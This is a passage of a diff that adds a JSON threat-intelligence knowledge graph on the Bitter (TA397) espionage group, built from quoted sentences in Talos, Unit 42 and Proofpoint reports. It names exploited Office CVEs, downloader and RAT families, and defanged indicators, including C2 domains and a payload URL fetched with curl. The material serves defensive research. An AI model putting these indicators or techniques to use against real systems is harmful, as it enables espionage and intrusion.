@@ -1,0 +1,3701 @@
+{
+  "nodes": {
+    "high_level": [
+      {
+        "node_id": "HL_29d95bab893a",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "SlideRAT",
+        "edges": [],
+        "source": {
+          "SlideRAT_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              17,
+              "Their arsenal mainly contains Bitter RAT, Artra downloader, SlideRAT and AndroRAT."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_2e8ca1ab3f71",
+        "node_class": "high_level",
+        "node_type": "Sector",
+        "node_text": "energy",
+        "edges": [],
+        "source": {
+          "energy_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              10,
+              "They have been active since 2013, targeting energy, engineering and government sectors in China, Pakistan and Saudi Arabia."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_37d5f6714279",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Pakistan",
+        "edges": [
+          "EDGE_75b66e947eb2",
+          "EDGE_ca1d67be25c4"
+        ],
+        "source": {
+          "Pakistan_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              10,
+              "They have been active since 2013, targeting energy, engineering and government sectors in China, Pakistan and Saudi Arabia."
+            ]
+          ],
+          "Pakistan_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": [
+            [
+              0,
+              "Since at least 2015, a suspected South Asian threat grouping known as BITTER has been targeting Pakistan and Chinese organizations using variants of a previously unreported downloader."
+            ],
+            [
+              4,
+              "Starting in September 2018 and continuing through the beginning of 2019, BITTER launched a wave of attacks targeting Pakistan and Saudi Arabia."
+            ],
+            [
+              6,
+              "Between mid-September 2018 and January 2019, Unit 42 observed the ArtraDownloader used in the targeting of Pakistan and Saudi Arabian organizations."
+            ],
+            [
+              7,
+              "Several malicious documents have been identified, all communicating with likely compromised, legitimate Pakistan websites to retrieve the payload."
+            ],
+            [
+              8,
+              "These websites include those associated with the Pakistan government and other Pakistan organizations."
+            ],
+            [
+              10,
+              "Between November 2018 and January 2019, an engineering and hydraulics company in Pakistan, almasoodgroup[.]com was observed hosting two AtraDownloader executables as well as a malicious document used to deliver a payload."
+            ],
+            [
+              27,
+              "They are observed targeting Pakistan, China, and Saudi Arabia using a customized downloader malware family named ArtraDownloader."
+            ]
+          ],
+          "Pakistan_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              14,
+              "The group has shifted between freemail providers – 163[.]com, 126[.]com, and ProtonMail – and various compromised accounts belonging to the governments of Pakistan, Bangladesh, and Madagascar."
+            ],
+            [
+              47,
+              "Based on our telemetry, TA397 primarily targets government and defense organizations in Asia and Europe, with a particular focus on entities with relations or interests in China, Pakistan, and other neighboring countries on the Indian subcontinent."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_3d11efd6af76",
+        "node_class": "high_level",
+        "node_type": "Sector",
+        "node_text": "government sectors",
+        "edges": [],
+        "source": {
+          "government sectors_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              10,
+              "They have been active since 2013, targeting energy, engineering and government sectors in China, Pakistan and Saudi Arabia."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_468625070e08",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Cisco Talos",
+        "edges": [],
+        "source": {
+          "Cisco Talos_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              1,
+              "Cisco Talos discovered an ongoing campaign operated by what we believe is the Bitter APT group since August 2021."
+            ]
+          ],
+          "Cisco Talos_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              20,
+              "While in 2019/2020, TA397 relied on exploiting CVEs, used ArtraDownloader to deploy additional payloads, and even experimented with Android malware, the group has consistently shown a preference for scheduled tasks in recent years, as reported by Proofpoint, Ahnlab, StrikeReady Labs, Cisco Talos, and others."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_4df73dcd8785",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Microsoft Excel",
+        "edges": [],
+        "source": {
+          "Microsoft Excel_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              5,
+              "The emails contain either a malicious RTF document or a Microsoft Excel spreadsheet weaponized to exploit known vulnerabilities."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_51ab16719f15",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Equation Editor",
+        "edges": [
+          "EDGE_e4a2879e3bec"
+        ],
+        "source": {
+          "Equation Editor_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              6,
+              "Once the victim opens the maldoc, the Equation Editor application is automatically launched to run the embedded objects containing the shellcode to exploit known vulnerabilities described by CVE-2017-11882, CVE-2018-0798 and CVE-2018-0802 — all in Microsoft Office — then downloads the trojan from the hosting server and runs it on the victim's machine."
+            ],
+            [
+              27,
+              "When the victim opens the RTF file with Microsoft Word, it invokes the Equation Editor application and executes the equation formula containing the Return-Oriented Programming (ROP) gadgets."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_59d0f43e5b07",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "AWS Global Accelerator",
+        "edges": [
+          "EDGE_f0594fdbf1af"
+        ],
+        "source": {
+          "AWS Global Accelerator_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              20,
+              "In this case, we believe that the actor is using the AWS Global Accelerator to redirect traffic to their actual C2 host, which is parked behind the legitimate AWS service."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_62951c4067f1",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Microsoft Word",
+        "edges": [
+          "EDGE_7e201a7f015d"
+        ],
+        "source": {
+          "Microsoft Word_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              27,
+              "When the victim opens the RTF file with Microsoft Word, it invokes the Equation Editor application and executes the equation formula containing the Return-Oriented Programming (ROP) gadgets."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_730eeacd8b86",
+        "node_class": "high_level",
+        "node_type": "Sector",
+        "node_text": "engineering",
+        "edges": [],
+        "source": {
+          "engineering_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              10,
+              "They have been active since 2013, targeting energy, engineering and government sectors in China, Pakistan and Saudi Arabia."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_8f229c579a9b",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Saudi Arabia",
+        "edges": [],
+        "source": {
+          "Saudi Arabia_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              10,
+              "They have been active since 2013, targeting energy, engineering and government sectors in China, Pakistan and Saudi Arabia."
+            ]
+          ],
+          "Saudi Arabia_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": [
+            [
+              4,
+              "Starting in September 2018 and continuing through the beginning of 2019, BITTER launched a wave of attacks targeting Pakistan and Saudi Arabia."
+            ],
+            [
+              5,
+              "This is the first reported instance of BITTER targeting Saudi Arabia."
+            ],
+            [
+              6,
+              "Between mid-September 2018 and January 2019, Unit 42 observed the ArtraDownloader used in the targeting of Pakistan and Saudi Arabian organizations."
+            ],
+            [
+              27,
+              "They are observed targeting Pakistan, China, and Saudi Arabia using a customized downloader malware family named ArtraDownloader."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_8ff8e010d7f9",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Windows 10",
+        "edges": [],
+        "source": {
+          "Windows 10_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              32,
+              "Systems running Windows 10 and later have the cURL utility, which the actor abuses in this campaign."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_902acd266219",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Bangladesh police",
+        "edges": [
+          "EDGE_5bb8261f04ba"
+        ],
+        "source": {
+          "Bangladesh police_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              4,
+              "The lure document is a spear-phishing email sent to high-ranking officers of the Rapid Action Battalion Unit of the Bangladesh police (RAB)."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_a7773cfe966b",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "AndroRAT",
+        "edges": [],
+        "source": {
+          "AndroRAT_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              17,
+              "Their arsenal mainly contains Bitter RAT, Artra downloader, SlideRAT and AndroRAT."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_a82a1a502a48",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "ZxxZ",
+        "edges": [],
+        "source": {
+          "ZxxZ_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              33,
+              "We named the trojan \"ZxxZ\" based on the name of a separator that the payload uses while sending information to the C2."
+            ],
+            [
+              34,
+              "This trojan is a downloader that downloads and executes the remote file."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_a87a238c89f2",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "China",
+        "edges": [],
+        "source": {
+          "China_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              10,
+              "They have been active since 2013, targeting energy, engineering and government sectors in China, Pakistan and Saudi Arabia."
+            ]
+          ],
+          "China_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": [
+            [
+              27,
+              "They are observed targeting Pakistan, China, and Saudi Arabia using a customized downloader malware family named ArtraDownloader."
+            ]
+          ],
+          "China_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              7,
+              "Geographically, this targeting is also almost exclusively observed against European entities with links to China or India’s neighbors, with some targeting also observed in China and South America."
+            ],
+            [
+              15,
+              "Within these campaigns, TA397 has been seen masquerading or spoofing various entities within the Chinese government, the Embassy of Mauritius in China, the Embassy of Madagascar in China, the Ministry of Foreign Affairs of the Republic of Korea, and the Foreign Affairs Office in Beijing to name a few."
+            ],
+            [
+              17,
+              "The campaigns with the subjects “PUBLIC INVESTMENTS PROJECTS 2025 _ MADAGASCAR” and “Note from Embassy of Mauritius 13 December 2024” both show TA397 attempting to appear as if the emails were legitimately from the Malagasy and Mauritian embassies respectively (despite using a Chinese freemail address in the campaign where the sender claimed to be the Mauritian embassy in China)."
+            ],
+            [
+              47,
+              "Based on our telemetry, TA397 primarily targets government and defense organizations in Asia and Europe, with a particular focus on entities with relations or interests in China, Pakistan, and other neighboring countries on the Indian subcontinent."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_bafa31e0eb09",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Microsoft's Desktop Manager",
+        "edges": [],
+        "source": {
+          "Microsoft's Desktop Manager_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              15,
+              "For example, in 2021, security researchers discovered that the adversary was exploiting the zero-day vulnerability CVE-2021-28310, a security flaw in Microsoft's Desktop Manager."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_c6426a20d0e4",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "cURL",
+        "edges": [
+          "EDGE_078f029bf19d"
+        ],
+        "source": {
+          "cURL_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              31,
+              "We noticed that the actor is using the cURL command-line utility to download the payload in the Windows environment."
+            ],
+            [
+              32,
+              "Systems running Windows 10 and later have the cURL utility, which the actor abuses in this campaign."
+            ]
+          ],
+          "curl_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              35,
+              "In this case, TA397 operators made an error by issuing a curl command that attempted to retrieve a payload from:\nhxxp://173.254.204[.]72/dune64.log\nHowever, this request returned a 404 error as the attackers had not placed a file with that name on their server – making the rename command and the execution of shh.exe fail."
+            ],
+            [
+              41,
+              "If double-clicked and run by the user, the CHM set up a MSTaskUI scheduled task that attempted to use PowerShell through conhost.exe to download and run the next stage payload every 16 minutes with the curl utility."
+            ]
+          ]
+        },
+        "alias": [
+          "curl"
+        ]
+      },
+      {
+        "node_id": "HL_cc9c0c761f31",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Bangladesh",
+        "edges": [
+          "EDGE_af8e6cee8033",
+          "EDGE_b29e315e3321"
+        ],
+        "source": {
+          "Bangladesh_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              3,
+              "This campaign targets an elite unit of the Bangladesh's government with a themed lure document alleging to relate to the regular operational tasks in the victim's organization."
+            ],
+            [
+              4,
+              "The lure document is a spear-phishing email sent to high-ranking officers of the Rapid Action Battalion Unit of the Bangladesh police (RAB)."
+            ],
+            [
+              11,
+              "In their latest campaign, they have extended their targeting to Bangladeshi government entities."
+            ]
+          ],
+          "Bangladesh_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              14,
+              "The group has shifted between freemail providers – 163[.]com, 126[.]com, and ProtonMail – and various compromised accounts belonging to the governments of Pakistan, Bangladesh, and Madagascar."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_d3e527a4d698",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Rapid Action Battalion Unit",
+        "edges": [
+          "EDGE_d595744fa952"
+        ],
+        "source": {
+          "Rapid Action Battalion Unit_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              4,
+              "The lure document is a spear-phishing email sent to high-ranking officers of the Rapid Action Battalion Unit of the Bangladesh police (RAB)."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_e0e0f8ee5b55",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Cisco Umbrella",
+        "edges": [],
+        "source": {
+          "Cisco Umbrella_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              23,
+              "The 99[.]83[.]154[.]118 IP also hosts mswsceventlog[.]net, according to Cisco Umbrella, a domain that was previously reported as Bitter's C2 server in a campaign against Pakistani government organizations."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_e56a276c8dd2",
+        "node_class": "high_level",
+        "node_type": "Sector",
+        "node_text": "South Asian government entities",
+        "edges": [],
+        "source": {
+          "South Asian government entities_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              2,
+              "This campaign is a typical example of the actor targeting South Asian government entities."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_ec3570bf1f6d",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Microsoft Office",
+        "edges": [
+          "EDGE_66f0c36df320"
+        ],
+        "source": {
+          "Microsoft Office_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              6,
+              "Once the victim opens the maldoc, the Equation Editor application is automatically launched to run the embedded objects containing the shellcode to exploit known vulnerabilities described by CVE-2017-11882, CVE-2018-0798 and CVE-2018-0802 — all in Microsoft Office — then downloads the trojan from the hosting server and runs it on the victim's machine."
+            ],
+            [
+              26,
+              "The Malicious RTF document is weaponized to exploit the stack overflow vulnerability CVE-2017-11882, which enables arbitrary code execution on victims' machines running vulnerable versions of Microsoft Office."
+            ],
+            [
+              30,
+              "The malicious Excel spreadsheet is weaponized to exploit the Microsoft Office memory corruption vulnerabilities CVE-2018-0798 and CVE-2018-0802."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_3b520e7d5fd6",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "BitterRAT",
+        "edges": [
+          "EDGE_6e56e6a61a1d"
+        ],
+        "source": {
+          "BitterRAT_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": [
+            [
+              3,
+              "This downloader has frequently been observed downloading the Remote Access Trojan (RAT) BitterRAT which is associated with BITTER threat operations."
+            ]
+          ],
+          "Bitter RAT_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              17,
+              "Their arsenal mainly contains Bitter RAT, Artra downloader, SlideRAT and AndroRAT."
+            ]
+          ]
+        },
+        "alias": [
+          "Bitter RAT"
+        ]
+      },
+      {
+        "node_id": "HL_8793fb593279",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "ArtraDownloader",
+        "edges": [
+          "EDGE_0071032259a0",
+          "EDGE_296bbe6f70fc",
+          "EDGE_32a2042b6388",
+          "EDGE_358bc61df97c",
+          "EDGE_7cac4f03c7fa",
+          "EDGE_ba1eb2e151f6",
+          "EDGE_c07997950918",
+          "EDGE_cb14a8dceebf",
+          "EDGE_d8cf38e8bbb4"
+        ],
+        "source": {
+          "ArtraDownloader_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": [
+            [
+              1,
+              "We have named this malware family ArtraDownloader based on a PDB string discovered within the samples."
+            ],
+            [
+              6,
+              "Between mid-September 2018 and January 2019, Unit 42 observed the ArtraDownloader used in the targeting of Pakistan and Saudi Arabian organizations."
+            ],
+            [
+              9,
+              "Beginning on Nov 6, 2018, the URL http://rmmun.org[.]pk/svch was observed hosting two ArtraDownloader files that communicated with the domains info.viewworld71[.]com or hewle.kielsoservice[.]net."
+            ],
+            [
+              16,
+              "This payload is an instance of ArtraDownloader variant 1 exploits CVE-2017-11882 (EQNEDT)."
+            ],
+            [
+              18,
+              "In total, roughly 80 unique instances of the ArtraDownloader malware family have been discovered."
+            ],
+            [
+              20,
+              "Overall, the ArtraDownloader malware family is not sophisticated, leveraging simple registry keys for persistence and HTTP requests to download and execute a remote file."
+            ],
+            [
+              27,
+              "They are observed targeting Pakistan, China, and Saudi Arabia using a customized downloader malware family named ArtraDownloader."
+            ]
+          ],
+          "Artra downloader_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              17,
+              "Their arsenal mainly contains Bitter RAT, Artra downloader, SlideRAT and AndroRAT."
+            ]
+          ]
+        },
+        "alias": [
+          "Artra downloader"
+        ]
+      },
+      {
+        "node_id": "HL_8d8305c76d1a",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "AVG",
+        "edges": [],
+        "source": {
+          "AVG_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": [
+            [
+              35,
+              "The malware proceeds to check to determine if the AVG security product is currently running on the system, however, this information does not appear to be used by ArtraDownloader."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_9dfd2d6e4b41",
+        "node_class": "high_level",
+        "node_type": "MalwareFamily",
+        "node_text": "MY24",
+        "edges": [],
+        "source": {
+          "MY24_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": [
+            [
+              23,
+              "In November 2017 we reported on malicious documents that were downloaded from the domain zmwardrobe[.]com and subsequently executed a payload referred to as MY24."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_fc573577a13d",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Pakistan government",
+        "edges": [],
+        "source": {
+          "Pakistan government_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": [
+            [
+              8,
+              "These websites include those associated with the Pakistan government and other Pakistan organizations."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_001424583ef1",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "India",
+        "edges": [],
+        "source": {
+          "India_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              1,
+              "While the group is frequently attributed to India (non-publicly), the reasoning behind this is not clearly documented."
+            ],
+            [
+              5,
+              "Our joint research with the Threatray research team aims to substantiate the claim that TA397 is an espionage-focused, state-backed threat actor, tasked with intelligence gathering in the interests of the Indian state."
+            ],
+            [
+              7,
+              "Geographically, this targeting is also almost exclusively observed against European entities with links to China or India’s neighbors, with some targeting also observed in China and South America."
+            ],
+            [
+              12,
+              "The targets, subjects, and lures of TA397’s campaigns exhibit these same qualities, which are consistent with activity that is in the intelligence interests of the Indian state."
+            ],
+            [
+              47,
+              "Based on our telemetry, TA397 primarily targets government and defense organizations in Asia and Europe, with a particular focus on entities with relations or interests in China, Pakistan, and other neighboring countries on the Indian subcontinent."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_0b0d408bef0e",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Embassy of Madagascar in China",
+        "edges": [],
+        "source": {
+          "Embassy of Madagascar in China_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              15,
+              "Within these campaigns, TA397 has been seen masquerading or spoofing various entities within the Chinese government, the Embassy of Mauritius in China, the Embassy of Madagascar in China, the Ministry of Foreign Affairs of the Republic of Korea, and the Foreign Affairs Office in Beijing to name a few."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_0c63539a6756",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "Microsoft Search Connector",
+        "edges": [],
+        "source": {
+          "Microsoft Search Connector_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              24,
+              "For example, in late 2024 shortly after the usage of alternate data streams in NTFS file systems, Proofpoint observed TA397 using an esoteric file type: Microsoft Search Connector (MSC) files, which allow users to connect with data stored in web services or remote storage locations."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_18ba27073941",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Threatray",
+        "edges": [],
+        "source": {
+          "Threatray_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              5,
+              "Our joint research with the Threatray research team aims to substantiate the claim that TA397 is an espionage-focused, state-backed threat actor, tasked with intelligence gathering in the interests of the Indian state."
+            ],
+            [
+              43,
+              "It is likely this payload selection is directly correlated to target selection and information gleaned from initial enumeration.The final payload of this campaign turned out to be BDarkRAT, which can be found in part two of this post on Threatray’s blog."
+            ],
+            [
+              51,
+              "As covered in part two of this blog series with Threatray, there is also overlap of tooling with other known Indian threat actors, Mysterious Elephant/APT-K-47 and Confucius through the use of ORPCBackdoor."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_18cb2f107a89",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Ahnlab",
+        "edges": [],
+        "source": {
+          "Ahnlab_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              20,
+              "While in 2019/2020, TA397 relied on exploiting CVEs, used ArtraDownloader to deploy additional payloads, and even experimented with Android malware, the group has consistently shown a preference for scheduled tasks in recent years, as reported by Proofpoint, Ahnlab, StrikeReady Labs, Cisco Talos, and others."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_2e9e1d15ef40",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Europe",
+        "edges": [],
+        "source": {
+          "Europe_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              47,
+              "Based on our telemetry, TA397 primarily targets government and defense organizations in Asia and Europe, with a particular focus on entities with relations or interests in China, Pakistan, and other neighboring countries on the Indian subcontinent."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_3a5ba471fd32",
+        "node_class": "high_level",
+        "node_type": "Tool",
+        "node_text": "Demon agent",
+        "edges": [],
+        "source": {
+          "Demon agent_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              38,
+              "Analysis of these payloads allowed us to identify shh.exe as KugelBlitz and dune64.bin as the Demon agent from the Havoc C2 framework."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_44eca055532d",
+        "node_class": "high_level",
+        "node_type": "Product",
+        "node_text": "ProtonMail",
+        "edges": [
+          "EDGE_d0e2f0fb242b"
+        ],
+        "source": {
+          "ProtonMail_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              14,
+              "The group has shifted between freemail providers – 163[.]com, 126[.]com, and ProtonMail – and various compromised accounts belonging to the governments of Pakistan, Bangladesh, and Madagascar."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_49884b2b2c2e",
+        "node_class": "high_level",
+        "node_type": "Organization",
+        "node_text": "Microsoft",
+        "edges": [],
+        "source": {
+          "Microsoft_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              24,
+              "For example, in late 2024 shortly after the usage of alternate data streams in NTFS file systems, Proofpoint observed TA397 using an esoteric file type: Microsoft Search Connector (MSC) files, which allow users to connect with data stored in web services or remote storage locations."
+            ],
+            [
+              27,
+              "These search connectors are Microsoft XML files and are abused in a similar way to library files or saved search files."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_50ef26c8e6f5",
+        "node_class": "high_level",
+        "node_type": "Location",
+        "node_text": "Madagascar",
+        "edges": [
+          "EDGE_1fe79ec38b79",
+          "EDGE_7efd945b2963",
+          "EDGE_b6c1f21f92f7",
+          "EDGE_d0528b141b90"
+        ],
+        "source": {
+          "Madagascar_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              14,
+              "The group has shifted between freemail providers – 163[.]com, 126[.]com, and ProtonMail – and various compromised accounts belonging to the governments of Pakistan, Bangladesh, and Madagascar."
+            ],
+            [
+              15,
+              "Within these campaigns, TA397 has been seen masquerading or spoofing various entities within the Chinese government, the Embassy of Mauritius in China, the Embassy of Madagascar in China, the Ministry of Foreign Affairs of the Republic of Korea, and the Foreign Affairs Office in Beijing to name a few."
+            ],
+            [
+              48,
+              "Masquerading as foreign offices, embassies, and government entities of Madagascar, Mauritius and more, indicates that TA397 not only has knowledge of legitimate affairs of those countries, but leverages this knowledge to bolster the legitimacy of its spearphishing operations."
+            ]
+          ]
+        }
+      },
+      {
+        "node_id": "HL_5827ab97cb13",
+        "node_class": "high_level",
+        "node_type": "ThreatActor",
+        "node_text": "TA397",
+        "edges": [
+          "EDGE_06e2f5bd0d8d",
+          "EDGE_126fc6326c89",
+          "EDGE_18dfb78659e5",
+          "EDGE_2247b2099edc",
+          "EDGE_22cbea80133f",
+          "EDGE_3ad865936259",
+          "EDGE_59b4ebe5e532",
+          "EDGE_5a679a1b915f",
+          "EDGE_68939b03b499",
+          "EDGE_0a8c60944aa0",
+          "EDGE_1467211cd877",
+          "EDGE_1b59d70a09cc",
+          "EDGE_5ff1b80cf3fc",
+          "EDGE_7087b6fde51f",
+          "EDGE_f099790e59fd"
+        ],
+        "source": {
+          "TA397_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": [
+            [
+              0,
+              "TA397 (Bitter) is an espionage group with a long history of targeting South Asian entities."
+            ],
+            [
+              2,
+              "In this blog we share evidence showing TA397 to be an India-aligned threat actor and release previously undisclosed evidence of the group’s targeting outside of Asia."
+            ],
+            [
+              3,
+              "In part one of this blog series, we explore TA397’s campaigns, targeting, and payload delivery and conduct an in-depth analysis of TA397’s infrastructure."
+            ],
+            [
+              4,
+              "Part two of this blog series expands on this research with a deep dive into TA397’s entire observed malware arsenal, highlighting how the group’s capabilities support its espionage operations."
+            ],
+            [
+              5,
+              "Our joint research with the Threatray research team aims to substantiate the claim that TA397 is an espionage-focused, state-backed threat actor, tasked with intelligence gathering in the interests of the Indian state."
+            ],
+            [
+              6,
+              "Proofpoint has observed TA397 frequently targeting an exceedingly small subset of targets."
+            ],
+            [
+              9,
+              "The TA397 targeting verticals we have observed are also highly characteristic of espionage-focused threat actors."
+            ],
+            [
+              12,
+              "The targets, subjects, and lures of TA397’s campaigns exhibit these same qualities, which are consistent with activity that is in the intelligence interests of the Indian state."
+            ],
+            [
+              13,
+              "TA397 uses a swathe of different email accounts to carry out its operations."
+            ],
+            [
+              15,
+              "Within these campaigns, TA397 has been seen masquerading or spoofing various entities within the Chinese government, the Embassy of Mauritius in China, the Embassy of Madagascar in China, the Ministry of Foreign Affairs of the Republic of Korea, and the Foreign Affairs Office in Beijing to name a few."
+            ],
+            [
+              16,
+              "There are two campaigns that are particularly interesting given TA397’s suspected attribution."
+            ],
+            [
+              17,
+              "The campaigns with the subjects “PUBLIC INVESTMENTS PROJECTS 2025 _ MADAGASCAR” and “Note from Embassy of Mauritius 13 December 2024” both show TA397 attempting to appear as if the emails were legitimately from the Malagasy and Mauritian embassies respectively (despite using a Chinese freemail address in the campaign where the sender claimed to be the Mauritian embassy in China)."
+            ],
+            [
+              18,
+              "Spearphishing emails remain TA397’s preferred technique for initial access, and to date, we are not aware of any reports indicating the use of alternative methods by this group."
+            ],
+            [
+              20,
+              "While in 2019/2020, TA397 relied on exploiting CVEs, used ArtraDownloader to deploy additional payloads, and even experimented with Android malware, the group has consistently shown a preference for scheduled tasks in recent years, as reported by Proofpoint, Ahnlab, StrikeReady Labs, Cisco Talos, and others."
+            ],
+            [
+              23,
+              "TA397 continues to follow the same approach today using scheduled tasks (detailed below)."
+            ],
+            [
+              24,
